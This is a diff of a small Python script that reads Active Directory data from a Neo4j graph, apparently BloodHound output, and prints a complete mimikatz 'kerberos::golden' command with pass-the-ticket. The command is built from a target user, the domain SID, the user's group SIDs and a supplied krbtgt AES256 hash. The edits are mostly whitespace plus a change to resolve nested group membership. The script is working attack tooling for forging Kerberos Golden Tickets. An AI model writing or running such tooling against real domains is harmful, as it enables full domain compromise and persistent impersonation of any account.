@@ -1,29 +1,29 @@
-#!/usr/bin/env` python 
-import argparse 
+#!/usr/bin/env python
+import argparse
 
-from neo4jrestclient.client import GraphDatabase 
+from neo4jrestclient.client import GraphDatabase
 from neo4jrestclient import client
 
 
 def get_domain_sid(db, domain):
-	domain_sid = None 
+	domain_sid = None
 
 	q = 'MATCH (d:Domain {{name: "{}"}}) return d.objectsid'.format(domain)
 	results = db.query(q)
-	
+
 	if len(results) > 1:
 		print("An error occurred")
 	else:
 		domain_sid = results[0][0]
 
-	return domain_sid 
+	return domain_sid
 
 
 def get_user_groups(db, user, domain):
 	user_sid = None
 	group_sids = []
 
-	q = 'MATCH (u:User {{name: "{}@{}"}}), (g:Group) MATCH (u)-[r:MemberOf]->(g) return u.objectsid, g.objectsid'.format(user, domain)
+	q = 'MATCH (u:User {{name: "{}@{}"}}), (g:Group) MATCH (u)-[r:MemberOf*]->(g) return DISTINCT u.objectsid, g.objectsid'.format(user, domain)
 	results = db.query(q, returns=(str, str))
 
 	for r in results:
@@ -46,7 +46,7 @@ def main():
 	parser.add_argument("domain", help="Golden Ticket Domain")
 	parser.add_argument("user", help="Golden Ticket Username")
 	parser.add_argument("krbtgt", help="AES256 Hash for krbtgt account")
-	
+
 	args = parser.parse_args()
 	domain_user = args.user.upper()
 	domain_name = args.domain.upper()
@@ -60,9 +60,9 @@ def main():
 	for sid in group_sids:
 		if domain_sid in sid:
 			groups.append(sid.split('-')[-1])
-	
+
 	user_sid = user_sid.split('-')[-1]
-	
+
 	print("mimikatz kerberos::golden /user:{} /aes256:{} /domain:{} /sid:{} /groups:{} /id:{} /endin:480 /renewmax:10080 /ptt".format(domain_user, args.krbtgt, domain_name, domain_sid, ",".join(groups), user_sid))
 
 
